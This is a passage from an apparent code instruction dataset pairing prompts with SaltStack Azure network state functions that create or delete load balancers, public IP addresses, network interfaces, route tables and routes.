'',\n        'changes': {}\n    }\n\n    if not isinstance(connection_auth, dict):\n        ret['comment'] = 'Connection information must be specified via connection_auth dictionary!'\n        return ret\n\n    if sku:\n        sku = {'name': sku.capitalize()}\n\n    load_bal = __salt__['azurearm_network.load_balancer_get'](\n        name,\n        resource_group,\n        azurearm_log_level='info',\n        **connection_auth\n    )\n\n    if 'error' not in load_bal:\n        # tag changes\n        tag_changes = __utils__['dictdiffer.deep_diff'](load_bal.get('tags', {}), tags or {})\n        if tag_changes:\n            ret['changes']['tags'] = tag_changes\n\n        # sku changes\n        if sku:\n            sku_changes = __utils__['dictdiffer.deep_diff'](load_bal.get('sku', {}), sku)\n            if sku_changes:\n                ret['changes']['sku'] = sku_changes\n\n        # frontend_ip_configurations changes\n        if frontend_ip_configurations:\n            comp_ret = __utils__['azurearm.compare_list_of_dicts'](\n                load_bal.get('frontend_ip_configurations', []),\n                frontend_ip_configurations,\n                ['public_ip_address', 'subnet']\n            )\n\n            if comp_ret.get('comment'):\n                ret['comment'] = '\"frontend_ip_configurations\" {0}'.format(comp_ret['comment'])\n                return ret\n\n            if comp_ret.get('changes'):\n                ret['changes']['frontend_ip_configurations'] = comp_ret['changes']\n\n        # backend_address_pools changes\n        if backend_address_pools:\n            comp_ret = __utils__['azurearm.compare_list_of_dicts'](\n                load_bal.get('backend_address_pools', []),\n                backend_address_pools\n            )\n\n            if comp_ret.get('comment'):\n                ret['comment'] = '\"backend_address_pools\" {0}'.format(comp_ret['comment'])\n                return ret\n\n            if comp_ret.get('changes'):\n                ret['changes']['backend_address_pools'] = comp_ret['changes']\n\n        # probes changes\n        if probes:\n            comp_ret = __utils__['azurearm.compare_list_of_dicts'](load_bal.get('probes', []), probes)\n\n            if comp_ret.get('comment'):\n                ret['comment'] = '\"probes\" {0}'.format(comp_ret['comment'])\n                return ret\n\n            if comp_ret.get('changes'):\n                ret['changes']['probes'] = comp_ret['changes']\n\n        # load_balancing_rules changes\n        if load_balancing_rules:\n            comp_ret = __utils__['azurearm.compare_list_of_dicts'](\n                load_bal.get('load_balancing_rules', []),\n                load_balancing_rules,\n                ['frontend_ip_configuration', 'backend_address_pool', 'probe']\n            )\n\n            if comp_ret.get('comment'):\n                ret['comment'] = '\"load_balancing_rules\" {0}'.format(comp_ret['comment'])\n                return ret\n\n            if comp_ret.get('changes'):\n                ret['changes']['load_balancing_rules'] = comp_ret['changes']\n\n        # inbound_nat_rules changes\n        if inbound_nat_rules:\n            comp_ret = __utils__['azurearm.compare_list_of_dicts'](\n                load_bal.get('inbound_nat_rules', []),\n                inbound_nat_rules,\n                ['frontend_ip_configuration']\n            )\n\n            if comp_ret.get('comment'):\n                ret['comment'] = '\"inbound_nat_rules\" {0}'.format(comp_ret['comment'])\n                return ret\n\n            if comp_ret.get('changes'):\n                ret['changes']['inbound_nat_rules'] = comp_ret['changes']\n\n        # inbound_nat_pools changes\n        if inbound_nat_pools:\n            comp_ret = __utils__['azurearm.compare_list_of_dicts'](\n                load_bal.get('inbound_nat_pools', []),\n                inbound_nat_pools,\n                ['frontend_ip_configuration']\n            )\n\n            if comp_ret.get('comment'):\n                ret['comment'] = '\"inbound_nat_pools\" {0}'.format(comp_ret['comment'])\n                return ret\n\n            if comp_ret.get('changes'):\n                ret['changes']['inbound_nat_pools'] = comp_ret['changes']\n\n        # outbound_nat_rules changes\n        if outbound_nat_rules:\n            comp_ret = __utils__['azurearm.compare_list_of_dicts'](\n                load_bal.get('outbound_nat_rules', []),\n                outbound_nat_rules,\n                ['frontend_ip_configuration']\n            )\n\n            if comp_ret.get('comment'):\n                ret['comment'] = '\"outbound_nat_rules\" {0}'.format(comp_ret['comment'])\n                return ret\n\n            if comp_ret.get('changes'):\n                ret['changes']['outbound_nat_rules'] = comp_ret['changes']\n\n        if not ret['changes']:\n            ret['result'] = True\n            ret['comment'] = 'Load balancer {0} is already present.'.format(name)\n            return ret\n\n        if __opts__['test']:\n            ret['result'] = None\n            ret['comment'] = 'Load balancer {0} would be updated.'.format(name)\n            return ret\n\n    else:\n        ret['changes'] = {\n            'old': {},\n            'new': {\n                'name': name,\n                'sku': sku,\n                'tags': tags,\n                'frontend_ip_configurations': frontend_ip_configurations,\n                'backend_address_pools': backend_address_pools,\n                'load_balancing_rules': load_balancing_rules,\n                'probes': probes,\n                'inbound_nat_rules': inbound_nat_rules,\n                'inbound_nat_pools': inbound_nat_pools,\n                'outbound_nat_rules': outbound_nat_rules,\n            }\n        }\n\n    if __opts__['test']:\n        ret['comment'] = 'Load balancer {0} would be created.'.format(name)\n        ret['result'] = None\n        return ret\n\n    lb_kwargs = kwargs.copy()\n    lb_kwargs.update(connection_auth)\n\n    load_bal = __salt__['azurearm_network.load_balancer_create_or_update'](\n        name=name,\n        resource_group=resource_group,\n        sku=sku,\n        tags=tags,\n        frontend_ip_configurations=frontend_ip_configurations,\n        backend_address_pools=backend_address_pools,\n        load_balancing_rules=load_balancing_rules,\n        probes=probes,\n        inbound_nat_rules=inbound_nat_rules,\n        inbound_nat_pools=inbound_nat_pools,\n        outbound_nat_rules=outbound_nat_rules,\n        **lb_kwargs\n    )\n\n    if 'error' not in load_bal:\n        ret['result'] = True\n        ret['comment'] = 'Load balancer {0} has been created.'.format(name)\n        return ret\n\n    ret['comment'] = 'Failed to create load balancer {0}! ({1})'.format(name, load_bal.get('error'))\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nensures a load balancer with the given name is absent in the given resource group.", "response": "def load_balancer_absent(name, resource_group, connection_auth=None):\n    '''\n    .. versionadded:: 2019.2.0\n\n    Ensure a load balancer does not exist in the resource group.\n\n    :param name:\n        Name of the load balancer.\n\n    :param resource_group:\n        The resource group assigned to the load balancer.\n\n    :param connection_auth:\n        A dict with subscription and authentication parameters to be used in connecting to the\n        Azure Resource Manager API.\n    '''\n    ret = {\n        'name': name,\n        'result': False,\n        'comment': '',\n        'changes': {}\n    }\n\n    if not isinstance(connection_auth, dict):\n        ret['comment'] = 'Connection information must be specified via connection_auth dictionary!'\n        return ret\n\n    load_bal = __salt__['azurearm_network.load_balancer_get'](\n        name,\n        resource_group,\n        azurearm_log_level='info',\n        **connection_auth\n    )\n\n    if 'error' in load_bal:\n        ret['result'] = True\n        ret['comment'] = 'Load balancer {0} was not found.'.format(name)\n        return ret\n\n    elif __opts__['test']:\n        ret['comment'] = 'Load balancer {0} would be deleted.'.format(name)\n        ret['result'] = None\n        ret['changes'] = {\n            'old': load_bal,\n            'new': {},\n        }\n        return ret\n\n    deleted = __salt__['azurearm_network.load_balancer_delete'](name, resource_group, **connection_auth)\n\n    if deleted:\n        ret['result'] = True\n        ret['comment'] = 'Load balancer {0} has been deleted.'.format(name)\n        ret['changes'] = {\n            'old': load_bal,\n            'new': {}\n        }\n        return ret\n\n    ret['comment'] = 'Failed to delete load balancer {0}!'.format(name)\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nensuring that a public IP address exists in the resource group with the given name resource group and tags are passed as tag metadata.", "response": "def public_ip_address_present(name, resource_group, tags=None, sku=None, public_ip_allocation_method=None,\n                              public_ip_address_version=None, dns_settings=None, idle_timeout_in_minutes=None,\n                              connection_auth=None, **kwargs):\n    '''\n    .. versionadded:: 2019.2.0\n\n    Ensure a public IP address exists.\n\n    :param name:\n        Name of the public IP address.\n\n    :param resource_group:\n        The resource group assigned to the public IP address.\n\n    :param dns_settings:\n        An optional dictionary representing a valid PublicIPAddressDnsSettings object. Parameters include\n        'domain_name_label' and 'reverse_fqdn', which accept strings. The 'domain_name_label' parameter is concatenated\n        with the regionalized DNS zone make up the fully qualified domain name associated with the public IP address.\n        If a domain name label is specified, an A DNS record is created for the public IP in the Microsoft Azure DNS\n        system. The 'reverse_fqdn' parameter is a user-visible, fully qualified domain name that resolves to this public\n        IP address. If the reverse FQDN is specified, then a PTR DNS record is created pointing from the IP address in\n        the in-addr.arpa domain to the reverse FQDN.\n\n    :param sku:\n        The public IP address SKU, which can be 'Basic' or 'Standard'.\n\n    :param public_ip_allocation_method:\n        The public IP allocation method. Possible values are: 'Static' and 'Dynamic'.\n\n    :param public_ip_address_version:\n        The public IP address version. Possible values are: 'IPv4' and 'IPv6'.\n\n    :param idle_timeout_in_minutes:\n        An integer representing the idle timeout of the public IP address.\n\n    :param tags:\n        A dictionary of strings can be passed as tag metadata to the public IP address object.\n\n    :param connection_auth:\n        A dict with subscription and authentication parameters to be used in connecting to the\n        Azure Resource Manager API.\n\n    Example usage:\n\n    .. code-block:: yaml\n\n        Ensure public IP exists:\n            azurearm_network.public_ip_address_present:\n                - name: pub_ip1\n                - resource_group: group1\n                - dns_settings:\n                    domain_name_label: decisionlab-ext-test-label\n                - sku: basic\n                - public_ip_allocation_method: static\n                - public_ip_address_version: ipv4\n                - idle_timeout_in_minutes: 4\n                - tags:\n                    contact_name: Elmer Fudd Gantry\n                - connection_auth: {{ profile }}\n                - require:\n                  - azurearm_resource: Ensure resource group exists\n\n    '''\n    ret = {\n        'name': name,\n        'result': False,\n        'comment': '',\n        'changes': {}\n    }\n\n    if not isinstance(connection_auth, dict):\n        ret['comment'] = 'Connection information must be specified via connection_auth dictionary!'\n        return ret\n\n    if sku:\n        sku = {'name': sku.capitalize()}\n\n    pub_ip = __salt__['azurearm_network.public_ip_address_get'](\n        name,\n        resource_group,\n        azurearm_log_level='info',\n        **connection_auth\n    )\n\n    if 'error' not in pub_ip:\n        # tag changes\n        tag_changes = __utils__['dictdiffer.deep_diff'](pub_ip.get('tags', {}), tags or {})\n        if tag_changes:\n            ret['changes']['tags'] = tag_changes\n\n        # dns_settings changes\n        if dns_settings:\n            if not isinstance(dns_settings, dict):\n                ret['comment'] = 'DNS settings must be provided as a dictionary!'\n                return ret\n\n            for key in dns_settings:\n                if dns_settings[key] != pub_ip.get('dns_settings', {}).get(key):\n                    ret['changes']['dns_settings'] = {\n                        'old': pub_ip.get('dns_settings'),\n                        'new': dns_settings\n                    }\n                    break\n\n        # sku changes\n        if sku:\n            sku_changes = __utils__['dictdiffer.deep_diff'](pub_ip.get('sku', {}), sku)\n            if sku_changes:\n                ret['changes']['sku'] = sku_changes\n\n        # public_ip_allocation_method changes\n        if public_ip_allocation_method:\n            if public_ip_allocation_method.capitalize() != pub_ip.get('public_ip_allocation_method'):\n                ret['changes']['public_ip_allocation_method'] = {\n                    'old': pub_ip.get('public_ip_allocation_method'),\n                    'new': public_ip_allocation_method\n                }\n\n        # public_ip_address_version changes\n        if public_ip_address_version:\n            if public_ip_address_version.lower() != pub_ip.get('public_ip_address_version', '').lower():\n                ret['changes']['public_ip_address_version'] = {\n                    'old': pub_ip.get('public_ip_address_version'),\n                    'new': public_ip_address_version\n                }\n\n        # idle_timeout_in_minutes changes\n        if idle_timeout_in_minutes and (int(idle_timeout_in_minutes) != pub_ip.get('idle_timeout_in_minutes')):\n            ret['changes']['idle_timeout_in_minutes'] = {\n                'old': pub_ip.get('idle_timeout_in_minutes'),\n                'new': idle_timeout_in_minutes\n            }\n\n        if not ret['changes']:\n            ret['result'] = True\n            ret['comment'] = 'Public IP address {0} is already present.'.format(name)\n            return ret\n\n        if __opts__['test']:\n            ret['result'] = None\n            ret['comment'] = 'Public IP address {0} would be updated.'.format(name)\n            return ret\n\n    else:\n        ret['changes'] = {\n            'old': {},\n            'new': {\n                'name': name,\n                'tags': tags,\n                'dns_settings': dns_settings,\n                'sku': sku,\n                'public_ip_allocation_method': public_ip_allocation_method,\n                'public_ip_address_version': public_ip_address_version,\n                'idle_timeout_in_minutes': idle_timeout_in_minutes,\n            }\n        }\n\n    if __opts__['test']:\n        ret['comment'] = 'Public IP address {0} would be created.'.format(name)\n        ret['result'] = None\n        return ret\n\n    pub_ip_kwargs = kwargs.copy()\n    pub_ip_kwargs.update(connection_auth)\n\n    pub_ip = __salt__['azurearm_network.public_ip_address_create_or_update'](\n        name=name,\n        resource_group=resource_group,\n        sku=sku,\n        tags=tags,\n        dns_settings=dns_settings,\n        public_ip_allocation_method=public_ip_allocation_method,\n        public_ip_address_version=public_ip_address_version,\n        idle_timeout_in_minutes=idle_timeout_in_minutes,\n        **pub_ip_kwargs\n    )\n\n    if 'error' not in pub_ip:\n        ret['result'] = True\n        ret['comment'] = 'Public IP address {0} has been created.'.format(name)\n        return ret\n\n    ret['comment'] = 'Failed to create public IP address {0}! ({1})'.format(name, pub_ip.get('error'))\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nensure that the public IP address is absent in the resource group.", "response": "def public_ip_address_absent(name, resource_group, connection_auth=None):\n    '''\n    .. versionadded:: 2019.2.0\n\n    Ensure a public IP address does not exist in the resource group.\n\n    :param name:\n        Name of the public IP address.\n\n    :param resource_group:\n        The resource group assigned to the public IP address.\n\n    :param connection_auth:\n        A dict with subscription and authentication parameters to be used in connecting to the\n        Azure Resource Manager API.\n    '''\n    ret = {\n        'name': name,\n        'result': False,\n        'comment': '',\n        'changes': {}\n    }\n\n    if not isinstance(connection_auth, dict):\n        ret['comment'] = 'Connection information must be specified via connection_auth dictionary!'\n        return ret\n\n    pub_ip = __salt__['azurearm_network.public_ip_address_get'](\n        name,\n        resource_group,\n        azurearm_log_level='info',\n        **connection_auth\n    )\n\n    if 'error' in pub_ip:\n        ret['result'] = True\n        ret['comment'] = 'Public IP address {0} was not found.'.format(name)\n        return ret\n\n    elif __opts__['test']:\n        ret['comment'] = 'Public IP address {0} would be deleted.'.format(name)\n        ret['result'] = None\n        ret['changes'] = {\n            'old': pub_ip,\n            'new': {},\n        }\n        return ret\n\n    deleted = __salt__['azurearm_network.public_ip_address_delete'](name, resource_group, **connection_auth)\n\n    if deleted:\n        ret['result'] = True\n        ret['comment'] = 'Public IP address {0} has been deleted.'.format(name)\n        ret['changes'] = {\n            'old': pub_ip,\n            'new': {}\n        }\n        return ret\n\n    ret['comment'] = 'Failed to delete public IP address {0}!'.format(name)\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nensure that a network interface with the given parameters is present.", "response": "def network_interface_present(name, ip_configurations, subnet, virtual_network, resource_group, tags=None,\n                              virtual_machine=None, network_security_group=None, dns_settings=None, mac_address=None,\n                              primary=None, enable_accelerated_networking=None, enable_ip_forwarding=None,\n                              connection_auth=None, **kwargs):\n    '''\n    .. versionadded:: 2019.2.0\n\n    Ensure a network interface exists.\n\n    :param name:\n        Name of the network interface.\n\n    :param ip_configurations:\n        A list of dictionaries representing valid NetworkInterfaceIPConfiguration objects. The 'name' key is required at\n        minimum. At least one IP Configuration must be present.\n\n    :param subnet:\n        Name of the existing subnet assigned to the network interface.\n\n    :param virtual_network:\n        Name of the existing virtual network containing the subnet.\n\n    :param resource_group:\n        The resource group assigned to the virtual network.\n\n    :param tags:\n        A dictionary of strings can be passed as tag metadata to the network interface object.\n\n    :param network_security_group:\n        The name of the existing network security group to assign to the network interface.\n\n    :param virtual_machine:\n        The name of the existing virtual machine to assign to the network interface.\n\n    :param dns_settings:\n        An optional dictionary representing a valid NetworkInterfaceDnsSettings object. Valid parameters are:\n\n        - ``dns_servers``: List of DNS server IP addresses. Use 'AzureProvidedDNS' to switch to Azure provided DNS\n          resolution. 'AzureProvidedDNS' value cannot be combined with other IPs, it must be the only value in\n          dns_servers collection.\n        - ``internal_dns_name_label``: Relative DNS name for this NIC used for internal communications between VMs in\n          the same virtual network.\n        - ``internal_fqdn``: Fully qualified DNS name supporting internal communications between VMs in the same virtual\n          network.\n        - ``internal_domain_name_suffix``: Even if internal_dns_name_label is not specified, a DNS entry is created for\n          the primary NIC of the VM. This DNS name can be constructed by concatenating the VM name with the value of\n          internal_domain_name_suffix.\n\n    :param mac_address:\n        Optional string containing the MAC address of the network interface.\n\n    :param primary:\n        Optional boolean allowing the interface to be set as the primary network interface on a virtual machine\n        with multiple interfaces attached.\n\n    :param enable_accelerated_networking:\n        Optional boolean indicating whether accelerated networking should be enabled for the interface.\n\n    :param enable_ip_forwarding:\n        Optional boolean indicating whether IP forwarding should be enabled for the interface.\n\n    :param connection_auth:\n        A dict with subscription and authentication parameters to be used in connecting to the\n        Azure Resource Manager API.\n\n    Example usage:\n\n    .. code-block:: yaml\n\n        Ensure network interface exists:\n            azurearm_network.network_interface_present:\n                - name: iface1\n                - subnet: vnet1_sn1\n                - virtual_network: vnet1\n                - resource_group: group1\n                - ip_configurations:\n                  - name: iface1_ipc1\n                    public_ip_address: pub_ip2\n                - dns_settings:\n                    internal_dns_name_label: decisionlab-int-test-label\n                - primary: True\n                - enable_accelerated_networking: True\n                - enable_ip_forwarding: False\n                - network_security_group: nsg1\n                - connection_auth: {{ profile }}\n                - require:\n                  - azurearm_network: Ensure subnet exists\n                  - azurearm_network: Ensure network security group exists\n                  - azurearm_network: Ensure another public IP exists\n\n    '''\n    ret = {\n        'name': name,\n        'result': False,\n        'comment': '',\n        'changes': {}\n    }\n\n    if not isinstance(connection_auth, dict):\n        ret['comment'] = 'Connection information must be specified via connection_auth dictionary!'\n        return ret\n\n    iface = __salt__['azurearm_network.network_interface_get'](\n        name,\n        resource_group,\n        azurearm_log_level='info',\n        **connection_auth\n    )\n\n    if 'error' not in iface:\n        # tag changes\n        tag_changes = __utils__['dictdiffer.deep_diff'](iface.get('tags', {}), tags or {})\n        if tag_changes:\n            ret['changes']['tags'] = tag_changes\n\n        # mac_address changes\n        if mac_address and (mac_address != iface.get('mac_address')):\n            ret['changes']['mac_address'] = {\n                'old': iface.get('mac_address'),\n                'new': mac_address\n            }\n\n        # primary changes\n        if primary is not None:\n            if primary != iface.get('primary', True):\n                ret['changes']['primary'] = {\n                    'old': iface.get('primary'),\n                    'new': primary\n                }\n\n        # enable_accelerated_networking changes\n        if enable_accelerated_networking is not None:\n            if enable_accelerated_networking != iface.get('enable_accelerated_networking'):\n                ret['changes']['enable_accelerated_networking'] = {\n                    'old': iface.get('enable_accelerated_networking'),\n                    'new': enable_accelerated_networking\n                }\n\n        # enable_ip_forwarding changes\n        if enable_ip_forwarding is not None:\n            if enable_ip_forwarding != iface.get('enable_ip_forwarding'):\n                ret['changes']['enable_ip_forwarding'] = {\n                    'old': iface.get('enable_ip_forwarding'),\n                    'new': enable_ip_forwarding\n                }\n\n        # network_security_group changes\n        nsg_name = None\n        if iface.get('network_security_group'):\n            nsg_name = iface['network_security_group']['id'].split('/')[-1]\n\n        if network_security_group and (network_security_group != nsg_name):\n            ret['changes']['network_security_group'] = {\n                'old': nsg_name,\n                'new': network_security_group\n            }\n\n        # virtual_machine changes\n        vm_name = None\n        if iface.get('virtual_machine'):\n            vm_name = iface['virtual_machine']['id'].split('/')[-1]\n\n        if virtual_machine and (virtual_machine != vm_name):\n            ret['changes']['virtual_machine'] = {\n                'old': vm_name,\n                'new': virtual_machine\n            }\n\n        # dns_settings changes\n        if dns_settings:\n            if not isinstance(dns_settings, dict):\n                ret['comment'] = 'DNS settings must be provided as a dictionary!'\n                return ret\n\n            for key in dns_settings:\n                if dns_settings[key].lower() != iface.get('dns_settings', {}).get(key, '').lower():\n                    ret['changes']['dns_settings'] = {\n                        'old': iface.get('dns_settings'),\n                        'new': dns_settings\n                    }\n                    break\n\n        # ip_configurations changes\n        comp_ret = __utils__['azurearm.compare_list_of_dicts'](\n            iface.get('ip_configurations', []),\n            ip_configurations,\n            ['public_ip_address', 'subnet']\n        )\n\n        if comp_ret.get('comment'):\n            ret['comment'] = '\"ip_configurations\" {0}'.format(comp_ret['comment'])\n            return ret\n\n        if comp_ret.get('changes'):\n            ret['changes']['ip_configurations'] = comp_ret['changes']\n\n        if not ret['changes']:\n            ret['result'] = True\n            ret['comment'] = 'Network interface {0} is already present.'.format(name)\n            return ret\n\n        if __opts__['test']:\n            ret['result'] = None\n            ret['comment'] = 'Network interface {0} would be updated.'.format(name)\n            return ret\n\n    else:\n        ret['changes'] = {\n            'old': {},\n            'new': {\n                'name': name,\n                'ip_configurations': ip_configurations,\n                'dns_settings': dns_settings,\n                'network_security_group': network_security_group,\n                'virtual_machine': virtual_machine,\n                'enable_accelerated_networking': enable_accelerated_networking,\n                'enable_ip_forwarding': enable_ip_forwarding,\n                'mac_address': mac_address,\n                'primary': primary,\n                'tags': tags,\n            }\n        }\n\n    if __opts__['test']:\n        ret['comment'] = 'Network interface {0} would be created.'.format(name)\n        ret['result'] = None\n        return ret\n\n    iface_kwargs = kwargs.copy()\n    iface_kwargs.update(connection_auth)\n\n    iface = __salt__['azurearm_network.network_interface_create_or_update'](\n        name=name,\n        subnet=subnet,\n        virtual_network=virtual_network,\n        resource_group=resource_group,\n        ip_configurations=ip_configurations,\n        dns_settings=dns_settings,\n        enable_accelerated_networking=enable_accelerated_networking,\n        enable_ip_forwarding=enable_ip_forwarding,\n        mac_address=mac_address,\n        primary=primary,\n        network_security_group=network_security_group,\n        virtual_machine=virtual_machine,\n        tags=tags,\n        **iface_kwargs\n    )\n\n    if 'error' not in iface:\n        ret['result'] = True\n        ret['comment'] = 'Network interface {0} has been created.'.format(name)\n        return ret\n\n    ret['comment'] = 'Failed to create network interface {0}! ({1})'.format(name, iface.get('error'))\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef network_interface_absent(name, resource_group, connection_auth=None):\n    '''\n    .. versionadded:: 2019.2.0\n\n    Ensure a network interface does not exist in the resource group.\n\n    :param name:\n        Name of the network interface.\n\n    :param resource_group:\n        The resource group assigned to the network interface.\n\n    :param connection_auth:\n        A dict with subscription and authentication parameters to be used in connecting to the\n        Azure Resource Manager API.\n    '''\n    ret = {\n        'name': name,\n        'result': False,\n        'comment': '',\n        'changes': {}\n    }\n\n    if not isinstance(connection_auth, dict):\n        ret['comment'] = 'Connection information must be specified via connection_auth dictionary!'\n        return ret\n\n    iface = __salt__['azurearm_network.network_interface_get'](\n        name,\n        resource_group,\n        azurearm_log_level='info',\n        **connection_auth\n    )\n\n    if 'error' in iface:\n        ret['result'] = True\n        ret['comment'] = 'Network interface {0} was not found.'.format(name)\n        return ret\n\n    elif __opts__['test']:\n        ret['comment'] = 'Network interface {0} would be deleted.'.format(name)\n        ret['result'] = None\n        ret['changes'] = {\n            'old': iface,\n            'new': {},\n        }\n        return ret\n\n    deleted = __salt__['azurearm_network.network_interface_delete'](name, resource_group, **connection_auth)\n\n    if deleted:\n        ret['result'] = True\n        ret['comment'] = 'Network interface {0} has been deleted.'.format(name)\n        ret['changes'] = {\n            'old': iface,\n            'new': {}\n        }\n        return ret\n\n    ret['comment'] = 'Failed to delete network interface {0}!)'.format(name)\n    return ret", "response": "Ensure a network interface does not exist in the resource group."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef route_table_present(name, resource_group, tags=None, routes=None, disable_bgp_route_propagation=None,\n                        connection_auth=None, **kwargs):\n    '''\n    .. versionadded:: 2019.2.0\n\n    Ensure a route table exists.\n\n    :param name:\n        Name of the route table.\n\n    :param resource_group:\n        The resource group assigned to the route table.\n\n    :param routes:\n        An optional list of dictionaries representing valid Route objects contained within a route table. See the\n        documentation for the route_present state or route_create_or_update execution module for more information on\n        required and optional parameters for routes. The routes are only managed if this parameter is present. When this\n        parameter is absent, implemented routes will not be removed, and will merely become unmanaged.\n\n    :param disable_bgp_route_propagation:\n        An optional boolean parameter setting whether to disable the routes learned by BGP on the route table.\n\n    :param tags:\n        A dictionary of strings can be passed as tag metadata to the route table object.\n\n    :param connection_auth:\n        A dict with subscription and authentication parameters to be used in connecting to the\n        Azure Resource Manager API.\n\n    Example usage:\n\n    .. code-block:: yaml\n\n        Ensure route table exists:\n            azurearm_network.route_table_present:\n                - name: rt1\n                - resource_group: group1\n                - routes:\n                  - name: rt1_route1\n                    address_prefix: '0.0.0.0/0'\n                    next_hop_type: internet\n                  - name: rt1_route2\n                    address_prefix: '192.168.0.0/16'\n                    next_hop_type: vnetlocal\n                - tags:\n                    contact_name: Elmer Fudd Gantry\n                - connection_auth: {{ profile }}\n                - require:\n                  - azurearm_resource: Ensure resource group exists\n\n    '''\n    ret = {\n        'name': name,\n        'result': False,\n        'comment': '',\n        'changes': {}\n    }\n\n    if not isinstance(connection_auth, dict):\n        ret['comment'] = 'Connection information must be specified via connection_auth dictionary!'\n        return ret\n\n    rt_tbl = __salt__['azurearm_network.route_table_get'](\n        name,\n        resource_group,\n        azurearm_log_level='info',\n        **connection_auth\n    )\n\n    if 'error' not in rt_tbl:\n        # tag changes\n        tag_changes = __utils__['dictdiffer.deep_diff'](rt_tbl.get('tags', {}), tags or {})\n        if tag_changes:\n            ret['changes']['tags'] = tag_changes\n\n        # disable_bgp_route_propagation changes\n        # pylint: disable=line-too-long\n        if disable_bgp_route_propagation and (disable_bgp_route_propagation != rt_tbl.get('disable_bgp_route_propagation')):\n            ret['changes']['disable_bgp_route_propagation'] = {\n                'old': rt_tbl.get('disable_bgp_route_propagation'),\n                'new': disable_bgp_route_propagation\n            }\n\n        # routes changes\n        if routes:\n            comp_ret = __utils__['azurearm.compare_list_of_dicts'](rt_tbl.get('routes', []), routes)\n\n            if comp_ret.get('comment'):\n                ret['comment'] = '\"routes\" {0}'.format(comp_ret['comment'])\n                return ret\n\n            if comp_ret.get('changes'):\n                ret['changes']['routes'] = comp_ret['changes']\n\n        if not ret['changes']:\n            ret['result'] = True\n            ret['comment'] = 'Route table {0} is already present.'.format(name)\n            return ret\n\n        if __opts__['test']:\n            ret['result'] = None\n            ret['comment'] = 'Route table {0} would be updated.'.format(name)\n            return ret\n\n    else:\n        ret['changes'] = {\n            'old': {},\n            'new': {\n                'name': name,\n                'tags': tags,\n                'routes': routes,\n                'disable_bgp_route_propagation': disable_bgp_route_propagation,\n            }\n        }\n\n    if __opts__['test']:\n        ret['comment'] = 'Route table {0} would be created.'.format(name)\n        ret['result'] = None\n        return ret\n\n    rt_tbl_kwargs = kwargs.copy()\n    rt_tbl_kwargs.update(connection_auth)\n\n    rt_tbl = __salt__['azurearm_network.route_table_create_or_update'](\n        name=name,\n        resource_group=resource_group,\n        disable_bgp_route_propagation=disable_bgp_route_propagation,\n        routes=routes,\n        tags=tags,\n        **rt_tbl_kwargs\n    )\n\n    if 'error' not in rt_tbl:\n        ret['result'] = True\n        ret['comment'] = 'Route table {0} has been created.'.format(name)\n        return ret\n\n    ret['comment'] = 'Failed to create route table {0}! ({1})'.format(name, rt_tbl.get('error'))\n    return ret", "response": "Ensures that a route table with the given name and resource group exists."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nensuring a route table is absent in the resource group.", "response": "def route_table_absent(name, resource_group, connection_auth=None):\n    '''\n    .. versionadded:: 2019.2.0\n\n    Ensure a route table does not exist in the resource group.\n\n    :param name:\n        Name of the route table.\n\n    :param resource_group:\n        The resource group assigned to the route table.\n\n    :param connection_auth:\n        A dict with subscription and authentication parameters to be used in connecting to the\n        Azure Resource Manager API.\n    '''\n    ret = {\n        'name': name,\n        'result': False,\n        'comment': '',\n        'changes': {}\n    }\n\n    if not isinstance(connection_auth, dict):\n        ret['comment'] = 'Connection information must be specified via connection_auth dictionary!'\n        return ret\n\n    rt_tbl = __salt__['azurearm_network.route_table_get'](\n        name,\n        resource_group,\n        azurearm_log_level='info',\n        **connection_auth\n    )\n\n    if 'error' in rt_tbl:\n        ret['result'] = True\n        ret['comment'] = 'Route table {0} was not found.'.format(name)\n        return ret\n\n    elif __opts__['test']:\n        ret['comment'] = 'Route table {0} would be deleted.'.format(name)\n        ret['result'] = None\n        ret['changes'] = {\n            'old': rt_tbl,\n            'new': {},\n        }\n        return ret\n\n    deleted = __salt__['azurearm_network.route_table_delete'](name, resource_group, **connection_auth)\n\n    if deleted:\n        ret['result'] = True\n        ret['comment'] = 'Route table {0} has been deleted.'.format(name)\n        ret['changes'] = {\n            'old': rt_tbl,\n            'new': {}\n        }\n        return ret\n\n    ret['comment'] = 'Failed to delete route table {0}!'.format(name)\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef route_present(name, address_prefix, next_hop_type, route_table, resource_group, next_hop_ip_address=None,\n                  connection_auth=None, **kwargs):\n    '''\n    .. versionadded:: 2019.2.0\n\n    Ensure a route exists within a route table.\n\n    :param name:\n        Name of the route.\n\n    :param address_prefix:\n        The destination CIDR to which the route applies.\n\n    :param next_hop_type:\n        The type of Azure hop the packet should be sent to. Possible values are: 'VirtualNetworkGateway', 'VnetLocal',\n        'Internet', 'VirtualAppliance', and 'None'.\n\n    :param next_hop_ip_address:\n        The IP address packets should be forwarded to. Next hop values are only allowed in routes where the next hop\n        type is 'VirtualAppliance'.\n\n    :param route_table:\n        The name of the existing route table which will contain the route.\n\n    :param resource_group:\n        The resource group assigned to the route table.\n\n    :param connection_auth:\n        A dict with subscription and authentication parameters to be used in connecting to the\n        Azure Resource Manager API.\n\n    Example usage:\n\n    .. code-block:: yaml\n\n        Ensure route exists:\n            azurearm_network.route_present:\n                - name: rt1_route2\n                - route_table: rt1\n                - resource_group: group1\n                - address_prefix: '192.168.0.0/16'\n                - next_hop_type: vnetlocal\n                - connection_auth: {{ profile }}\n                - require:\n                  - azurearm_network: Ensure route table exists\n\n    '''\n    ret = {\n        'name': name,\n        'result': False,\n        'comment': '',\n        'changes': {}\n    }\n\n    if not isinstance(connection_auth, dict):\n        ret['comment'] = 'Connection information must be specified via connection_auth dictionary!'\n        return ret\n\n    route = __salt__['azurearm_network.route_get'](\n        name,\n        route_table,\n        resource_group,\n        azurearm_log_level='info',\n        **connection_auth\n    )\n\n    if 'error' not in route:\n        if address_prefix != route.get('address_prefix'):\n            ret['changes']['address_prefix'] = {\n                'old': route.get('address_prefix'),\n                'new': address_prefix\n            }\n\n        if next_hop_type.lower() != route.get('next_hop_type', 